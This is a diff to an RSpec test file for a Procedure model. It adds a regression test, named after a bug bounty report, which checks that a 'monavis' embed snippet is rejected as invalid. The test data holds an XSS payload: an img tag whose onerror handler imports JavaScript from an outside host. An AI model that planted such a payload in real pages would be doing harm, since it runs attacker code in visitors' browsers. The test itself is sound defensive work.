@@ -419,6 +419,15 @@ describe Procedure do
         let(:procedure) { build(:procedure, monavis_embed: monavis_jedonnemonavis) }
         it { expect(procedure.valid?).to eq(false) }
       end
+
+      context 'when YWH-PGM5381-46 pentester won' do
+        monavis_ywh_pgm5381_46 = <<-MSG
+         <a href="https://monavis.numerique.gouv.fr/Demarches/123456?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d4"></a>
+         <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.pngx" alt="x" onerror=import('https://hks.ec/ATOXSS-ze4fzfze54.js') />
+        MSG
+        let(:procedure) { build(:procedure, monavis_embed: monavis_ywh_pgm5381_46) }
+        it { expect(procedure.valid?).to eq(false) }
+      end
     end
 
     describe 'duree de conservation dans ds' do
